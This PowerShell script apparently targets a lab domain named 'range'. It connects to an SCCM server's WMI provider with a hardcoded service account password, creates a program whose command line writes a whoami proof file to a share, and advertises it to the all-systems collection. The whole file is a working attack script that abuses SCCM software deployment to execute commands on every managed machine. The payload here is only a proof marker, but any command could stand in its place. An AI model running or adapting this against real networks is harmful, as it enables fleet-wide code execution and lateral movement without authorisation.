$ErrorActionPreference = "Stop"
$opts = New-Object System.Management.ConnectionOptions
$opts.Username = 'range\svc_sccm'
$opts.Password = 's3rv1c3_SCCM!'
$opts.Authentication = [System.Management.AuthenticationLevel]::PacketPrivacy
$scope = New-Object System.Management.ManagementScope("\\mbr02.range.local\root\SMS\site_CAD", $opts)
$scope.Connect()

$proof = 'cmd /c "echo WT039_PROOF %USERNAME% %COMPUTERNAME% %DATE% %TIME% > C:\Shares\vault\wt039-proof.txt & whoami >> C:\Shares\vault\wt039-proof.txt"'

Write-Output "=== Create SMS_Program ==="
$progClass = New-Object System.Management.ManagementClass($scope, "SMS_Program", $null)
$prog = $progClass.CreateInstance()
$prog["PackageID"] = "CAD00007"
$prog["ProgramName"] = "CADRE-WT039-Run"
$prog["CommandLine"] = $proof
$prog["RunMode"] = [uint32]1
$prog["WorkingDirectory"] = ""
$prog["Duration"] = [uint32]5
$prog["Comment"] = "WT039 payload"
try {
    $prog.Put()
    $prog.Get()
    Write-Output "PROG_OK ProgramName=$($prog['ProgramName'])"
} catch {
    Write-Output "PROG_FAIL: $($_.Exception.Message)"
    if ($_.ErrorDetails) { Write-Output "  DETAILS: $($_.ErrorDetails.Message)" }
}

Write-Output "=== Create SMS_Advertisement ==="
$advClass = New-Object System.Management.ManagementClass($scope, "SMS_Advertisement", $null)
$adv = $advClass.CreateInstance()
$adv["AdvertisementName"] = "CADRE-WT039-Deploy"
$adv["PackageID"] = "CAD00007"
$adv["ProgramName"] = "CADRE-WT039-Run"
$adv["CollectionID"] = "SMS00001"
$adv["Comment"] = "WT039"
$adv["DeviceFlags"] = [uint32]0
try {
    $adv.Put()
    $adv.Get()
    Write-Output "ADV_OK AdvertisementID=$($adv['AdvertisementID'])"
} catch {
    Write-Output "ADV_FAIL: $($_.Exception.Message)"
    if ($_.ErrorDetails) { Write-Output "  DETAILS: $($_.ErrorDetails.Message)" }
}
Write-Output "DONE"
